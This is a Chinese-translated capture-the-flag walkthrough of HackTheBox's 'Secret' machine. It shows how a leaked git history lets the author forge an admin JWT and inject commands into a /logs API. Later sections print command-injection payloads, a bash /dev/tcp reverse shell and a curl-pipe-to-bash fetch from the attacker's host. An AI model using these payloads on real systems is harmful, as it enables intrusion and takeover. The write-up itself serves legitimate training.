<html>
<head>
<title>Secret from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子的秘密——详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/secret-from-hackthebox-detailed-walkthrough-d256fb39a910?source=collection_archive---------0-----------------------#2022-04-21">https://infosecwriteups.com/secret-from-hackthebox-detailed-walkthrough-d256fb39a910?source=collection_archive---------0-----------------------#2022-04-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="75e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术。</p><h1 id="a354" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/fa699f0f26860c14c32af4c6ff41e538.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*VnDcZof_GySndasR.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">黑客盒子的秘密</figcaption></figure><p id="1326" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Secret在HackTheBox上被评为简易机。我们从运行在机器上的网站上找到的备份开始。在那里，我们发现了许多有趣的文件，这些文件引导我们与API进行交互。最终，我们创建了一个JSON Web令牌，并可以执行远程代码执行，我们用它来获得一个反向shell。升级到root涉及进一步的代码审查，这次是在包装盒上找到的c程序。由此我们发现崩溃程序允许我们通过核心转储看到内存的内容。在那里我们可以检索根标志。</p><p id="366f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所需技能是对Java代码的基本理解。学到的技能是操纵JSON Web令牌和检查敏感信息的核心转储。</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.eu/home/machines/profile/408" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">秘密——破解盒子::渗透测试实验室</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.eu</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lp ly"/></div></div></a></div><h1 id="da25" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="d2b7" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/c070e7e8ad1884f13a78ff565eab458a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N-JQxJWymfnWTCJpWetydg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">盒子的Nmap扫描</figcaption></figure><p id="ee3c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只有三个开放的端口，有趣的是其中两个是nginx。让我们先将box IP添加到hosts文件中:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="805e" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/secret]<br/>└─# echo "10.10.11.120 secret.htb" &gt;&gt; /etc/hosts</span></pre><h1 id="fae8" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">网站(全球资讯网的主机站)</h1><p id="f5d4" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">现在看看端口80上的网站:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nh"><img src="../Images/49d93c04ba4d51d990940dddba0c6018.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*1vSnLxsisbcokAWn.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">文档的哑文档网站</figcaption></figure><p id="4e25" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里没什么，只是一个关于文档的静态站点。点击现场演示按钮，我们将进入以下页面:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/918bb0e84401183b7109c028f1f396a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:878/format:webp/0*Ns4Oy1MfQvzpW__e.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">在秘密盒子上发现的API</figcaption></figure><p id="843d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到了一个API，稍后我们将与之交互。在主页下方，我们可以看到一个下载源代码的链接:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/700c82979d305341e1db71ad16d98a92.png" data-original-src="https://miro.medium.com/v2/resize:fit:1290/format:webp/0*fW9wo_M9CVKSqoU0.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">下载源代码的链接</figcaption></figure><h1 id="21c8" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">源代码审查</h1><p id="adb6" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">让我们抓住它看一看:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f857" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/secret]<br/>└─# wget http://secret.htb/download/files.zip<br/>--2021-11-18 21:35:40--  http://secret.htb/download/files.zip<br/>Resolving secret.htb (secret.htb)... 10.10.11.120<br/>Connecting to secret.htb (secret.htb)|10.10.11.120|:80... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 28849603 (28M) [application/zip]<br/>Saving to: ‘files.zip’<br/>files.zip      100%[================&gt;]  27.51M  2.74MB/s    in 9.8s    <br/>2021-11-18 21:35:50 (2.81 MB/s) - ‘files.zip’ saved [28849603/28849603]<br/><br/>┌──(root💀kali)-[~/htb/secret]<br/>└─# unzip files.zip<br/>Archive:  files.zip<br/>   creating: local-web/<br/>   creating: local-web/node_modules/<br/>   creating: local-web/node_modules/get-stream/<br/>  inflating: local-web/node_modules/get-stream/buffer-stream.js  <br/>&lt;SNIP&gt;<br/><br/>┌──(root💀kali)-[~/htb/secret]<br/>└─# cd local-web<br/><br/>┌──(root💀kali)-[~/htb/secret/local-web]<br/>└─# ls -lsa<br/> 4 -rw-rw-r--   1 root root    72 Sep  3 06:59 .env<br/> 4 drwxrwxr-x   8 root root  4096 Sep  8 19:33 .git<br/> 4 -rw-rw-r--   1 root root   885 Sep  3 06:56 index.js<br/> 4 drwxrwxr-x   2 root root  4096 Aug 13 05:42 model<br/> 4 drwxrwxr-x 201 root root  4096 Aug 13 05:42 node_modules<br/> 4 -rw-rw-r--   1 root root   491 Aug 13 05:42 package.json<br/>68 -rw-rw-r--   1 root root 69452 Aug 13 05:42 package-lock.json<br/> 4 drwxrwxr-x   4 root root  4096 Sep  3 06:54 public<br/> 4 drwxrwxr-x   2 root root  4096 Sep  3 07:32 routes<br/> 4 drwxrwxr-x   4 root root  4096 Aug 13 05:42 src<br/> 4 -rw-rw-r--   1 root root   651 Aug 13 05:42 validations.js</span></pre><p id="fd21" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在本地网络文件夹中，我们看到许多文件。我看到的第一个是。环境:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="af50" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/secret/local-web]<br/>└─# cat .env          <br/>DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'<br/>TOKEN_SECRET = secret</span></pre><p id="58de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不知道这是为了什么，但似乎很可疑！</p><p id="8a94" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看index.js，我们会发现一些有趣的事情:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nk"><img src="../Images/61fc83d620114687e2b499d38e04cde0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_HjZ6jjiGpE2M0ZXsaKrVA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">index.js的内容</figcaption></figure><p id="2ddb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一个名为auth的文件用于设置名为authRoute的应用程序，它看起来像是一个我们可以连接的API端点。</p><p id="8fb6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看auth.js文件，我们看到一个注册端点:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nl"><img src="../Images/9a16c2f369bbb882bc42c9769fac4e53.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oRnEfNpWLU7DOuJ2HaZNhA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">内容认证</figcaption></figure><p id="fb38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有一个登录部分，它检查一个帐户，如果有效，就创建一个JSON Web令牌(JWT ):</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nm"><img src="../Images/a2f76dfc69cabbcc3d58aacb09d7cddc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KiMcdORCMzUsCjvJnwV81A.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">auth.js的更多内容</figcaption></figure><p id="a29d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有一个validation.js文件，它检查用户的注册和登录是否有效。如果你需要在深入之前阅读一些资料，这篇文章是对JWT的很好介绍。</p><h1 id="979d" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">与API交互</h1><p id="b677" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">根据配置文件中的信息，我们现在知道如何尝试创建我们自己的用户:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi no"><img src="../Images/455b4f640abcd818d11b8c53d6bf3a99.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FVGoIgKWGJy3C6--qj7LcA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">通过缺少电子邮件的API创建用户</figcaption></figure><p id="f8c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">试图注册一个只有姓名字段的用户，会返回一条消息说需要电子邮件。让我们再试一次，添加一个假地址:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi np"><img src="../Images/39676983cea262559db5a648b8050ab7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FlD2PFUMD5N41hN8MUwBgg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">通过缺少密码的API创建用户</figcaption></figure><p id="4baf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">成功了，我们现在得到另一条消息，这次告诉我们提供一个密码。让我们用密码再试一次:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nq"><img src="../Images/705b9117694dabf943ac088dec707d0b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ThoCxHBkbPQDes22n0lpVw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">通过缺少密码的API创建用户</figcaption></figure><p id="36da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根据提供的三个必需参数，我们已经创建了用户。现在我们可以尝试用它登录:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nr"><img src="../Images/db95a027cdefaf49b34483f96f256963.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aZVb2AzNYtvN0Ck5f7j8tg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">向新创建的用户验证</figcaption></figure><h1 id="1245" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">更多代码审查</h1><p id="b066" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">这很有效，正如我们在配置文件中看到的，我们的用户返回了一个JWT。在再次查看源代码后，我在routes文件夹中找到了private.js:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3bd8" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/secret/local-web]<br/>└─# cat routes/private.js <br/>const router = require('express').Router();<br/>const verifytoken = require('./verifytoken')<br/>const User = require('../model/user');<br/><br/>router.get('/priv', verifytoken, (req, res) =&gt; {<br/>   // res.send(req.user)<br/>    const userinfo = { name: req.user }<br/>    const name = userinfo.name.name;<br/>    if (name == 'theadmin'){<br/>        res.json({<br/>            creds:{<br/>                role:"admin", <br/>                username:"theadmin",<br/>                desc : "welcome back admin,"<br/>            }<br/>        })<br/>    }<br/>    else{<br/>        res.json({<br/>            role: {<br/>                role: "you are normal user",<br/>                desc: userinfo.name.name<br/>            }<br/>        })<br/>    }<br/>})</span></pre><p id="b575" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这为我们提供了另一个名为/priv的端点。有趣的是，它告诉我们，如果我们拥有用户名theadmin并提供有效的令牌，我们就拥有管理员角色，否则我们就是普通用户。</p><p id="b8d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">稍后，在同一个文件中，我们看到了一个名为/logs的端点，如果我们是管理员用户，它将允许我们传递一个名为file的参数，该参数是未清理的:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="684d" class="nc km iq my b gy nd ne l nf ng">router.get('/logs', verifytoken, (req, res) =&gt; {<br/>    const file = req.query.file;<br/>    const userinfo = { name: req.user }<br/>    const name = userinfo.name.name;<br/>    <br/>    if (name == 'theadmin'){<br/>        const getLogs = `git log --oneline ${file}`;<br/>        exec(getLogs, (err , output) =&gt;{<br/>            if(err){<br/>                res.status(500).send(err);<br/>                return<br/>            }<br/>            res.json(output);<br/>        })<br/>    }<br/>    else{<br/>        res.json({<br/>            role: {<br/>                role: "you are normal user",<br/>                desc: userinfo.name.name<br/>            }<br/>        })<br/>    }<br/>})</span></pre><p id="f526" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，很明显，我们需要找到一种方法来为theadmin用户获取有效的JWT。首先，让我们尝试将我们自己的用户令牌发送到我们刚刚找到的/priv端点:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="346f" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/secret]<br/>└─# curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoicGVuY2VyIiwiZW1haWwiOiJwZW5jZXJAdGVzdC5jb20iLCJpYXQiOjE2MzcyNzMwOTN9.iVtsUPT-D-uHBCNnTIsRRAPyvLQSI5mIEvYqn9JJzLk'<br/>{"role":{"role":"you are normal user","desc":"pencer"}}</span></pre><p id="ecb4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有了这个认证令牌，我们可以与priv API进行交互，但是作为一个普通用户，我们不能做很多事情。</p><h1 id="6e39" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">JWT工具</h1><p id="9a79" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们可以用JWT _工具解码JWT，让我们得到它:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ns"><img src="../Images/81c16641e7a97a3ff006453f9d97ef6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*65VKvqYO0USK7hNPzJd71g.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">获取jwt_tool的最新版本</figcaption></figure><p id="51c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将作为经过身份验证的用户收到的JWT传递给它:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nt"><img src="../Images/fe44d7258744dea980ecea613bd20b73.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ogbor4L12_hcKntzfTHXqw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">解码JWT以查看内容</figcaption></figure><p id="0ff8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它解码了令牌，并向我们显示由_id、名称和电子邮件组成的有效载荷。</p><p id="2e92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回顾我们目前的发现。我们知道，要取得进展，我们需要找到一种为管理员用户生成令牌的方法。为此，我们需要一个密码，我们之前发现了这个:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3ff4" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/secret/local-web]<br/>└─# cat .env          <br/>DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'<br/>TOKEN_SECRET = secret</span></pre><h1 id="2664" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">GitTools</h1><p id="39b5" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">这是行不通的，但是有一点我们之前没有注意到。git文件夹包含在原始下载中。让我们提取的内容。使用GitTools的git:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nu"><img src="../Images/dbf51d5dc091c85cff433deb389b30d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9NmIw2UFLtRrDGTA095SaQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">提取Git存储库的内容</figcaption></figure><p id="c80f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">提取所有文件花了一些时间，但现在我们可以查看提交:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nv"><img src="../Images/4b64e4429af4c6d7712bfb70408f86e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oNHpHQ7NBvCXK37Vft8hRA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Git文件中的提交列表</figcaption></figure><p id="6981" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在git repo中有六次提交。我搜索了TOKEN_SECRET，这是我们以前在。env文件的主文件夹，并发现了一些有趣的东西:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nw"><img src="../Images/b68147a358ae728d2488a91ffe2e3544.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dK9z31a8-bfOWw47VHei3w.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">在Git提交中搜索秘密</figcaption></figure><h1 id="2d58" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">创建管理员JWT</h1><p id="97db" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们可以使用这个秘密和我们之前用jwt_tool创建的现有用户JWT来创建一个被篡改的令牌，作为admin:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nx"><img src="../Images/26fba2dbfd36fba90edfe59e06cbbd25.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WVzBmfO6qD7VfLhSimFUrA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">已创建被篡改的令牌</figcaption></figure><h1 id="1156" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">远程代码执行</h1><p id="877d" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">有了这个新的令牌，我们可以使用之前找到的/logs API，并作为admin进行身份验证。这让我们使用在源代码中看到未排序的参数。让我们尝试获取passwd文件:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ny"><img src="../Images/94280803ebcd3ba216c086510fff798e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JQF46AFi4NxiFj5H4mrfHw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">抓取passwd文件</figcaption></figure><p id="3b71" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它工作了，我们看到了passwd文件的内容。值得注意的是用户dasith。让我们看看我们是服务器上的哪个用户:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nz"><img src="../Images/8e61c65a17c237e151b66ad5b487ee15.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*t3D3FLxXc1lKGgRQQEAryw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">正在检查用户ID</figcaption></figure><p id="dc7c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，我们是dasith用户，让我们看看他们的主文件夹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nz"><img src="../Images/4944d21095f7a6ca5a6155893c0b4670.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PI6-sz--BsIvM59R2PMhew.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">在用户个人文件夹中查找</figcaption></figure><h1 id="d88a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">用户标志</h1><p id="b2ad" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">不妨抓住用户标志:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="0a70" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/secret]<br/>└─# curl 'http://secret.htb/api/logs?file=;cat+/home/dasith/user.txt' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBlbmNlckB0ZXN0LmNvbSIsImlhdCI6MTYzNzI3MzA5M30.OBy7ffsMnK9IlG1uBm28X4aYbCMw4mgr3kZyFMXDGfE'<br/>&lt;SNIP&gt;<br/>c5d9aea30b9787de4c6776da13f5f57f</span></pre><h1 id="2915" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">反向外壳</h1><p id="77da" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">现在让我们得到一个反向shell，我们可以使用这样一个简单的shell，并把它放在一个shell文件中，这样我们就可以执行它了:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="e13f" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/secret]<br/>└─# cat pencer_shell.sh<br/>#!/bin/bash<br/>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.15/1338 0&gt;&amp;1'</span></pre><p id="dfdd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">启动一个web服务器，这样我们就可以获取文件，同时启动一个netcat监听器来捕获我们的shell。现在像以前一样作为参数发送:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="54d3" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/secret]<br/>└─# curl 'http://secret.htb/api/logs?file=;curl+http://10.10.15.15/pencer_shell.sh+|+bash' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBlbmNlckB0ZXN0LmNvbSIsImlhdCI6MTYzNzI3MzA5M30.OBy7ffsMnK9IlG1uBm28X4aYbCMw4mgr3kZyFMXDGfE'<br/>{"killed":false,"code":1,"signal":null,"cmd":"git log --oneline ;curl http://10.10.15.15/pencer_shell.sh | bash"}</span></pre><p id="8431" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到了从我们的网络服务器上下载的文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f93f" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/secret]<br/>└─# python3 -m http.server 80<br/>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br/>10.10.11.120 - - [18/Nov/2021 22:11:37] "GET /pencer_shell.sh HTTP/1.1" 200 -</span></pre><p id="837c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我们看到我们的外壳被连接起来:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d218" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/secret]<br/>└─# nc -lvvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.15.15] from secret.htb [10.10.11.120] 51496<br/>bash: cannot set terminal process group (1116): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>dasith@secret:~/local-web$ id<br/>uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)</span></pre><p id="0668" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先让我们得到一个更好的外壳:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="e49c" class="nc km iq my b gy nd ne l nf ng">dasith@secret:~/local-web$ python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>dasith@secret:~/local-web$ 